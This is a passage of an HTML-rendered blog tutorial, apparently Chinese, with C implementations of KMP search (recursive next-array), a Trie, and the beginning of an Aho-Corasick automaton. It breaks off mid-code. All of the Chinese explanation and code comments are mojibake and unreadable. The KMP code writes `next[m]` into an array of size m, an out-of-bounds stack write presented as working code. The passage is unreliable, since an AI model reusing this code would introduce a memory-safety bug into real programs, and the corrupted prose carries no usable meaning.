class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        buildNextRecursive(pattern, next, i, next[j], len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildNextArr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    buildNextRecursive(pattern, next, <span class="number">0</span>, <span class="number">-1</span>, m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildNextRecursive</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == len) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">-1</span> || pattern[i] == pattern[j]) &#123;</span><br><span class="line">        next[i + <span class="number">1</span>] = j + <span class="number">1</span>;</span><br><span class="line">        buildNextRecursive(pattern, next, i + <span class="number">1</span>, j + <span class="number">1</span>, len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        buildNextRecursive(pattern, next, i, next[j], len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildNext</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    buildNextRecursive(pattern, next, <span class="number">0</span>, <span class="number">-1</span>, m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kmpSearch</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *text, <span class="type">const</span> <span class="type">char</span> *pattern)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">strlen</span>(text);</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> next[m];</span><br><span class="line">    buildNext(pattern, next);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; m) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || text[i] == pattern[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == m) &#123;</span><br><span class="line">        <span class="keyword">return</span> i - m; <span class="comment">// åŒ¹é…æˆåŠŸï¼Œè¿”å›åŒ¹é…çš„èµ·å§‹ä½ç½®</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// æœªæ‰¾åˆ°åŒ¹é…</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *text = <span class="string">&quot;ababcababcabcabc&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *pattern = <span class="string">&quot;abcabc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result = kmpSearch(text, pattern);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Pattern found at position: %d\n&quot;</span>, result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Pattern not found.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Trieæ ‘"><a href="#Trieæ ‘" class="headerlink" title="Trieæ ‘"></a>Trieæ ‘</h3><p>Tireæ ‘ä¹Ÿå«å­—å…¸æ ‘ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„å‰ç¼€æ ‘ç»“æ„ã€‚å®ƒæ˜¯å“ˆå¸Œæ ‘çš„ä¸€ç§å˜ç§ï¼Œä¸“é—¨ä¸ºå­—ç¬¦ä¸²å¤„ç†è®¾è®¡çš„æ•°æ®ç»“æ„ã€‚å…¸å‹çš„åº”ç”¨æ˜¯ç”¨äº<strong>ç»Ÿè®¡å’Œæ’åºå¤§é‡çš„å­—ç¬¦ä¸²</strong>ï¼ˆä¸é™äºå­—ç¬¦ä¸²ï¼‰å› æ­¤ç»å¸¸è¢«æœç´¢å¼•æ“ç”¨äºæ–‡å­—è¯é¢‘ç»Ÿè®¡ã€‚å®ƒçš„ä¼˜ç‚¹æ˜¯ï¼šæœ€å¤§é™åº¦åœ°å‡å°‘æ— è°“çš„å­—ç¬¦ä¸²æ¯”è¾ƒã€‚Trieçš„æ ¸å¿ƒæ€æƒ³æ˜¯ç©ºé—´æ¢æ—¶é—´ï¼Œ<strong>åˆ©ç”¨å­—ç¬¦ä¸²çš„å…¬å…±å‰ç¼€æ¥é™ä½æŸ¥è¯¢æ—¶é—´çš„å¼€é”€</strong>ä»¥è¾¾åˆ°æé«˜æ•ˆç‡çš„ç›®çš„ã€‚</p><p>å¦‚å›¾ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231118100217713.png" alt="image-20231118100217713" style="zoom:50%;" /><blockquote><p>å‰ç¼€æ ‘çš„3ä¸ª<strong>åŸºæœ¬æ€§è´¨</strong>ï¼š</p></blockquote><ul><li>æ ¹èŠ‚ç‚¹ä¸åŒ…å«å­—ç¬¦ï¼Œé™¤æ ¹èŠ‚ç‚¹å¤–æ¯ä¸€ä¸ªèŠ‚ç‚¹åªåŒ…å«ä¸€ä¸ªå­—ç¬¦ã€‚</li><li>ä»æ ¹èŠ‚ç‚¹åˆ°æŸä¸€èŠ‚ç‚¹ï¼Œè·¯å¾„ä¸Šç»è¿‡çš„å­—ç¬¦è¿æ¥èµ·æ¥ï¼Œä¸ºè¯¥èŠ‚ç‚¹å¯¹åº”çš„å­—ç¬¦ä¸²ã€‚</li><li>æ¯ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹åŒ…å«çš„å­—ç¬¦éƒ½ä¸ç›¸åŒã€‚</li></ul><blockquote><p>åº”ç”¨</p></blockquote><ul><li>**å­—ç¬¦ä¸²æ£€ç´¢:**äº‹å…ˆå°†å·²çŸ¥çš„ä¸€äº›å­—ç¬¦ä¸²ï¼ˆå­—å…¸ï¼‰çš„æœ‰å…³ä¿¡æ¯ä¿å­˜åˆ°trieæ ‘é‡Œï¼ŒæŸ¥æ‰¾å¦å¤–ä¸€äº›æœªçŸ¥å­—ç¬¦ä¸²æ˜¯å¦å‡ºç°è¿‡æˆ–è€…å‡ºç°é¢‘ç‡ã€‚</li><li><strong>å­—ç¬¦ä¸²æœ€é•¿å…¬å…±å‰ç¼€</strong>:Trieæ ‘åˆ©ç”¨å¤šä¸ªå­—ç¬¦ä¸²çš„å…¬å…±å‰ç¼€æ¥èŠ‚çœå­˜å‚¨ç©ºé—´ï¼Œåä¹‹ï¼Œå½“æˆ‘ä»¬æŠŠå¤§é‡å­—ç¬¦ä¸²å­˜å‚¨åˆ°ä¸€æ£µtrieæ ‘ä¸Šæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿå¾—åˆ°æŸäº›å­—ç¬¦ä¸²çš„å…¬å…±å‰ç¼€ã€‚</li><li><strong>æ’åº</strong>:Trieæ ‘æ˜¯ä¸€æ£µå¤šå‰æ ‘ï¼Œåªè¦å…ˆéå†æ•´æ£µæ ‘ï¼Œè¾“å‡ºç›¸åº”çš„å­—ç¬¦ä¸²ä¾¿æ˜¯æŒ‰å­—å…¸åºæ’åºçš„ç»“æœã€‚</li></ul><h4 id="Cè¯­è¨€å®ç°"><a href="#Cè¯­è¨€å®ç°" class="headerlink" title="Cè¯­è¨€å®ç°"></a>Cè¯­è¨€å®ç°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALPHABET_SIZE 26    <span class="comment">//è¿™é‡Œåªè€ƒè™‘äº†26ä¸ªè‹±æ–‡å°å†™å­—æ¯ã€‚å¦‚æœè€ƒè™‘ä¸­æ–‡å°±æ˜¯åŠ ä¸Šç‰¹æ®Šç¼–ï¼Œå¢åŠ ALPHABET_SIZE</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trie æ ‘èŠ‚ç‚¹ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">children</span>[<span class="title">ALPHABET_SIZE</span>];</span>    </span><br><span class="line">    <span class="type">int</span> isEndOfWord;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæ–°çš„ Trie èŠ‚ç‚¹ï¼Œåˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">struct</span> TrieNode* <span class="title function_">createTrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> (<span class="keyword">struct</span> TrieNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TrieNode));</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">            node-&gt;children[i] = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;isEndOfWord = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ’å…¥å­—ç¬¦ä¸²åˆ° Trie æ ‘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; key[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = key[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;children[index] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            node-&gt;children[index] = createTrieNode();</span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;children[index];</span><br><span class="line">    &#125;</span><br><span class="line">    node-&gt;isEndOfWord = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœç´¢å­—ç¬¦ä¸²åœ¨ Trie æ ‘ä¸­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; key[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = key[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;children[index] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// æœªæ‰¾åˆ°å­—ç¬¦ä¸²</span></span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;children[index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (node != <span class="literal">NULL</span> &amp;&amp; node-&gt;isEndOfWord);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡Šæ”¾ Trie æ ‘çš„å†…å­˜</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">freeTrie</span><span class="params">(<span class="keyword">struct</span> TrieNode* root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">        freeTrie(root-&gt;children[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">root</span> =</span> createTrieNode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’å…¥ä¸€äº›å­—ç¬¦ä¸²</span></span><br><span class="line">    insert(root, <span class="string">&quot;apple&quot;</span>);</span><br><span class="line">    insert(root, <span class="string">&quot;app&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœç´¢å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, search(root, <span class="string">&quot;apple&quot;</span>) ? <span class="string">&quot;Found&quot;</span> : <span class="string">&quot;Not found&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, search(root, <span class="string">&quot;apples&quot;</span>) ? <span class="string">&quot;Found&quot;</span> : <span class="string">&quot;Not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡Šæ”¾ Trie æ ‘çš„å†…å­˜</span></span><br><span class="line">    freeTrie(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ACè‡ªåŠ¨æœº-1"><a href="#ACè‡ªåŠ¨æœº-1" class="headerlink" title="ACè‡ªåŠ¨æœº"></a>ACè‡ªåŠ¨æœº</h3><p>æ ¸å¿ƒç®—æ³•ä»æ˜¯å¯»æ‰¾æ¨¡å¼ä¸²å†…éƒ¨è§„å¾‹ï¼Œè¿›è¡Œæ¯æ¬¡å¤±é…çš„é«˜æ•ˆè·³è½¬ã€‚è¿™ç‚¹å’ŒKMPç®—æ³•ä¸€è‡´ï¼Œä¸åŒç‚¹åœ¨äº,ACè‡ªåŠ¨æœºå¯»æ‰¾æ¨¡å¼ä¸²çš„ç›¸åŒå‰ç¼€ã€‚</p><p>ACè‡ªåŠ¨æœºä½¿ç”¨å‰ç¼€æ ‘æ¥å­˜æ”¾æ‰€æœ‰æ¨¡å¼ä¸²çš„å‰ç¼€ï¼Œé€šè¿‡å¤±é…æŒ‡é’ˆæ¥å¤„ç†å¤±é…çš„è·³è½¬ã€‚ACè‡ªåŠ¨æœºçš„æ„å»ºï¼Œ<strong>é¦–å…ˆéœ€è¦æ„å»ºTrieæ ‘ï¼Œå…¶æ¬¡éœ€è¦æ·»åŠ å¤±é…æŒ‡é’ˆï¼ˆfailè¡¨ï¼‰ï¼Œæœ€åéœ€è¦æ¨¡å¼åŒ¹é…ã€‚</strong></p><blockquote><p>æ ¸å¿ƒæ€æƒ³å°±æ˜¯trieæ ‘çš„åŒ¹é…æ¨¡å¼ï¼ŒåŠ ä¸Šç±»ä¼¼äºKMPä¸­nextæ•°ç»„çš„failè¡¨ï¼Œæ¥è¿›è¡Œæ¯æ¬¡å¤±é…çš„é«˜æ•ˆè·³è½¬</p></blockquote><ul><li>æ„å»ºTrieæ ‘</li></ul><p>ä¹‹å‰å·²ç»è®²è¿‡ï¼Œä¸å†èµ˜è¿°</p><ul><li>æ„å»ºfailè¡¨</li></ul><p>æ„å»ºfailè¡¨ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®ï¼Œæ¯ä¸ªèŠ‚ç‚¹ï¼šçˆ¶èŠ‚ç‚¹ã€å­èŠ‚ç‚¹åˆ—è¡¨ã€failèŠ‚ç‚¹ã€èŠ‚ç‚¹çš„å€¼å’Œæ˜¯å¦æ˜¯å°¾èŠ‚ç‚¹è¿™å‡ ä¸ªå±æ€§ç»„æˆï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231118102636608.png" alt="image-20231118102636608" style="zoom:33%;" /><p>failè¡¨ä¸­ä¿å­˜äº†å¤±é…æ—¶çš„failæŒ‡é’ˆï¼ŒfailæŒ‡é’ˆå°±æ˜¯å½“å‰ä½ç½®å¤±é…ä»¥åèƒ½å¤Ÿè·³è½¬ç»§ç»­è¿›è¡ŒåŒ¹é…çš„å­—ç¬¦ä½ç½®ï¼Œè¾¾åˆ°åŒ¹é…è¿‡ç¨‹ä¸­ä¸éœ€è¦å›æº¯çš„æ•ˆæœã€‚æ„å»ºè¿‡ç¨‹ä½¿ç”¨äº†BFSï¼ˆå®½åº¦ä¼˜å…ˆæœç´¢ï¼‰ç®—æ³•ã€‚<strong>æœç´¢è¿‡ç¨‹æ–‡å­—æè¿°ï¼š</strong></p><p>å‡è®¾å½“å‰èŠ‚ç‚¹ä¸ºtemp,  æˆ‘ä»¬æ‰¾åˆ°tempçš„çˆ¶èŠ‚ç‚¹ï¼Œå¾—åˆ°çˆ¶èŠ‚ç‚¹çš„failèŠ‚ç‚¹ï¼Œå†æ‰¾åˆ°failèŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œå¯»æ‰¾å­èŠ‚ç‚¹ä¸­æ˜¯å¦æœ‰å’ŒtempèŠ‚ç‚¹å€¼ç›¸åŒçš„èŠ‚ç‚¹ï¼Œè‹¥å­˜åœ¨åˆ™tempçš„failèŠ‚ç‚¹æŒ‡å‘è¯¥èŠ‚ç‚¹ï¼Œå¦‚ä¸å­˜åœ¨ç»§ç»­å¯»æ‰¾è¯¥failèŠ‚ç‚¹çš„failèŠ‚ç‚¹ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ç›¸åŒå€¼çš„èŠ‚ç‚¹æˆ–è¾¾åˆ°rootèŠ‚ç‚¹ã€‚</p><p><img src="C:\Users\æ¨æ¬£ç„¶\AppData\Roaming\Typora\typora-user-images\image-20231118121207793.png" alt="image-20231118121207793"></p><p>ä¸éš¾å‘ç°æ„å»ºå‡ºæ¥çš„failæŒ‡é’ˆå®é™…è·ŸKMPç®—æ³•çš„nextæ•°ç»„ç±»ä¼¼ã€‚</p><ul><li>æ¨¡å¼åŒ¹é…</li></ul><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/bestsort/article/details/82947639">https://blog.csdn.net/bestsort/article/details/82947639</a></p><p>éå¸¸å½¢è±¡å®¹æ˜“ç†è§£</p><h4 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALPHABET_SIZE 26    <span class="comment">//å¤§å°ä¸ä¸€å®š26</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trie æ ‘èŠ‚ç‚¹ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">children</span>[<span class="title">ALPHABET_SIZE</span>];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">fail</span>;</span></span><br><span class="line">    <span class="type">int</span> isEndOfWord;</span><br><span class="line">    <span class="type">int</span> depth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é˜Ÿåˆ—èŠ‚ç‚¹ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é˜Ÿåˆ—ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">front</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>* <span class="title">rear</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæ–°çš„ Trie èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">struct</span> TrieNode* <span class="title function_">createTrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> (<span class="keyword">struct</span> TrieNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> 